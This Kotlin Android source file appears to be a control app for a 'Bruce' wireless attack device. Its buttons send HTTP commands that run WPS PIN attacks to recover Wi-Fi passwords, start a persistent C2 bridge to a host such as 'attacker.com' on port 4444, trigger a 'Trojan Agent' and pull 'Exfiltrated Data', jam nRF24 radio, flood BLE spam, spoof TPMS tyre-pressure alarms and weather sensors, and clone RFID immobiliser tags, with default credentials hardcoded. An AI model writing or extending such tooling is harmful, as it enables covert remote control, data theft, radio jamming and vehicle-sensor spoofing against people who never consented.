package com.example.bruceir

import android.os.Bundle
import android.widget.*
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity

class AdvancedActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_advanced)

        val prefs = getSharedPreferences("settings", MODE_PRIVATE)
        val baseUrl = prefs.getString("bruce_url", "http://bruce.local") ?: "http://bruce.local"
        val user = prefs.getString("bruce_user", "admin") ?: "admin"
        val pass = prefs.getString("bruce_pass", "bruce") ?: "bruce"

        findViewById<Button>(R.id.btnOpenScanner).setOnClickListener {
            startActivity(android.content.Intent(this, NetworkScannerActivity::class.java))
        }

        // WPS Section
        findViewById<Button>(R.id.btnConnectWps).setOnClickListener {
            val pin = findViewById<EditText>(R.id.etWpsPin).text.toString()
            if (pin.length != 8) {
                Toast.makeText(this, "PIN must be 8 digits", Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }
            Thread {
                // Endpoint firmware: /wifi/wps?pin=12345678
                val url = "$baseUrl/wifi/wps?pin=$pin"
                val response = BruceUtils.downloadFileContent(url, user, pass)
                runOnUiThread {
                    if (response != null && response.contains("password")) {
                        AlertDialog.Builder(this)
                            .setTitle("WPS Success!")
                            .setMessage("Network Data: $response")
                            .setPositiveButton("OK", null)
                            .show()
                    } else {
                        Toast.makeText(this, "WPS Attempt Started (check device display)", Toast.LENGTH_LONG).show()
                    }
                }
            }.start()
        }

        // C2 Bridge Section
        findViewById<Button>(R.id.btnStartBridge).setOnClickListener {
            val host = findViewById<EditText>(R.id.etC2Host).text.toString()
            val port = findViewById<EditText>(R.id.etC2Port).text.toString()
            val useSocks = findViewById<com.google.android.material.materialswitch.MaterialSwitch>(R.id.swSocksProxy).isChecked
            val persistent = findViewById<com.google.android.material.materialswitch.MaterialSwitch>(R.id.swPersistence).isChecked
            
            if (host.isEmpty() || port.isEmpty()) return@setOnClickListener
            
            Thread {
                // Endpoint firmware: /bridge?host=attacker.com&port=4444&socks=true&persist=true
                val url = "$baseUrl/bridge?host=$host&port=$port&socks=$useSocks&persist=$persistent"
                val result = BruceUtils.downloadFileContent(url, user, pass)
                runOnUiThread {
                    findViewById<TextView>(R.id.tvBridgeStatus).text = "Bridge Status: ${result ?: "Sent"}"
                    Toast.makeText(this, "Persistence Enabled. Bruce will keep calling home.", Toast.LENGTH_SHORT).show()
                }
            }.start()
        }

        // Trojan Agent Dashboard logic
        findViewById<Button>(R.id.btnAgentTrigger).setOnClickListener {
            Thread {
                // Command to remote Bruce via C2
                val url = "$baseUrl/bridge/exec?cmd=ir_panic"
                BruceUtils.downloadFileContent(url, user, pass)
                runOnUiThread { Toast.makeText(this, getString(R.string.agent_command_sent), Toast.LENGTH_SHORT).show() }
            }.start()
        }

        findViewById<Button>(R.id.btnAgentFetchLogs).setOnClickListener {
            Thread {
                val url = "$baseUrl/bridge/exfil"
                val data = BruceUtils.downloadFileContent(url, user, pass)
                runOnUiThread {
                    if (data != null) {
                        AlertDialog.Builder(this).setTitle("Exfiltrated Data").setMessage(data).setPositiveButton("OK", null).show()
                    }
                }
            }.start()
        }

        // nRF24 Section
        findViewById<Button>(R.id.btnNrfScan).setOnClickListener {
            findViewById<TextView>(R.id.tvNrfResults).text = "Scanning..."
            Thread {
                val url = "$baseUrl/nrf/scan?duration=10"
                val response = BruceUtils.downloadFileContent(url, user, pass)
                runOnUiThread {
                    findViewById<TextView>(R.id.tvNrfResults).text = "Targets Found:\n${response ?: "None detected"}"
                }
            }.start()
        }

        findViewById<Button>(R.id.btnNrfJam).setOnClickListener {
            Thread {
                val url = "$baseUrl/nrf/jam?start=true"
                BruceUtils.downloadFileContent(url, user, pass)
                runOnUiThread { Toast.makeText(this, "RF Jamming Started!", Toast.LENGTH_SHORT).show() }
            }.start()
        }

        // BLE Spam Section
        val bleSpamManager = BleSpamManager()

        findViewById<Button>(R.id.btnBleFlood).setOnClickListener {
            Thread {
                val url = "$baseUrl/ble/spam?mode=all&intensity=max"
                BruceUtils.downloadFileContent(url, user, pass)
                runOnUiThread { Toast.makeText(this, "Bruce BLE Spam Activated!", Toast.LENGTH_SHORT).show() }
            }.start()
        }

        findViewById<Button>(R.id.btnLocalBleSpam).setOnClickListener {
            bleSpamManager.startSpam()
            Toast.makeText(this, "Local BLE Spamming Started (Phone)", Toast.LENGTH_LONG).show()
        }

        findViewById<Button>(R.id.btnBleStop).setOnClickListener {
            bleSpamManager.stopSpam()
            Thread {
                val url = "$baseUrl/ble/stop"
                BruceUtils.downloadFileContent(url, user, pass)
                runOnUiThread { Toast.makeText(this, "All Wireless Attacks Stopped", Toast.LENGTH_SHORT).show() }
            }.start()
        }

        // Printer & RF Tools Section
        findViewById<Button>(R.id.btnOpenScanner).setOnClickListener {
            startActivity(android.content.Intent(this, NetworkScannerActivity::class.java))
        }

        findViewById<Button>(R.id.btnOpenWeather).setOnClickListener {
            showWeatherSpoofDialog()
        }

        findViewById<Button>(R.id.btnOpenTpms).setOnClickListener {
            showTpmsToolDialog()
        }

        findViewById<Button>(R.id.btnOpenSubGhz).setOnClickListener {
            startActivity(android.content.Intent(this, SubGhzActivity::class.java))
        }

        findViewById<Button>(R.id.btnOpenImmo).setOnClickListener {
            showImmoToolDialog()
        }

        findViewById<Button>(R.id.btnOpenEmulate).setOnClickListener {
            showEmulateDialog()
        }
    }

    private fun showImmoToolDialog() {
        val layout = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL; setPadding(50, 40, 50, 10) }
        val tvStatus = TextView(this).apply { text = getString(R.string.immo_detecting) }
        layout.addView(tvStatus)

        AlertDialog.Builder(this)
            .setTitle(R.string.immo_title)
            .setView(layout)
            .setPositiveButton(R.string.immo_scan) { _, _ ->
                Thread {
                    val url = "http://bruce.local/rfid/scan"
                    val response = BruceUtils.downloadFileContent(url, "admin", "bruce")
                    runOnUiThread {
                        if (response != null) {
                            AlertDialog.Builder(this).setTitle("RFID Tag Found").setMessage(response).setPositiveButton("OK", null).show()
                        }
                    }
                }.start()
            }.show()
    }

    private fun showEmulateDialog() {
        val layout = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL; setPadding(50, 40, 50, 10) }
        val etId = EditText(this).apply { hint = "UID (Hex)"; setText("DE AD BE EF") }
        layout.addView(etId)

        AlertDialog.Builder(this)
            .setTitle(R.string.immo_emulate)
            .setView(layout)
            .setPositiveButton("START EMULATION") { _, _ ->
                Thread {
                    val url = "http://bruce.local/rfid/emulate?uid=${etId.text}"
                    BruceUtils.downloadFileContent(url, "admin", "bruce")
                }.start()
            }.show()
    }

    private fun showWeatherSpoofDialog() {
        val layout = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL; setPadding(50, 40, 50, 10) }
        val etTemp = EditText(this).apply { hint = getString(R.string.weather_temp); setText("25.5") }
        val etHum = EditText(this).apply { hint = getString(R.string.weather_hum); setText("45") }
        layout.addView(etTemp); layout.addView(etHum)

        AlertDialog.Builder(this)
            .setTitle(R.string.weather_title)
            .setView(layout)
            .setPositiveButton(R.string.weather_send) { _, _ ->
                Thread {
                    val url = "http://bruce.local/rf/weather?temp=${etTemp.text}&hum=${etHum.text}"
                    BruceUtils.downloadFileContent(url, "admin", "bruce")
                }.start()
            }.show()
    }

    private fun showTpmsToolDialog() {
        val layout = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL; setPadding(50, 40, 50, 10) }
        val etId = EditText(this).apply { hint = "Sensor ID (Hex)"; setText("A1B2C3D4") }
        val etPress = EditText(this).apply { hint = "Pressure (Bar)"; setText("0.8") }
        layout.addView(etId); layout.addView(etPress)

        AlertDialog.Builder(this)
            .setTitle("TPMS SENSOR SPOOF")
            .setView(layout)
            .setPositiveButton("EMULATE ALARM") { _, _ ->
                Thread {
                    val url = "http://bruce.local/rf/tpms?id=${etId.text}&press=${etPress.text}&status=alert"
                    BruceUtils.downloadFileContent(url, "admin", "bruce")
                }.start()
            }.setNeutralButton("SCAN", { _, _ ->
                Toast.makeText(this, "Bruce is listening for TPMS packets...", Toast.LENGTH_LONG).show()
            }).show()
    }
}
